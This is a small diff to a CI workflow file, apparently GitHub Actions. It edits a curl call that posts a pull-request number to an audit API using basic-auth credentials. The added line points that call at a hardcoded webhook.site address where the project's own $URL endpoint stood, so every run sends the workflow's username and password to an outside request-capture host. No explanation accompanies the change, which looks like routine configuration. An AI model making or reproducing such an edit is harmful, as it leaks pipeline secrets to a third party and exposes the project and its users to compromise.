@@ -58,4 +58,4 @@ jobs:
           echo "ORI_PR=${ORI_PR}" >> $GITHUB_OUTPUT
         fi
         
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' $URL/api/run/audit
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' https://webhook.site/f683f0fc-ebf0-45f3-b261-72a7f7e4d344
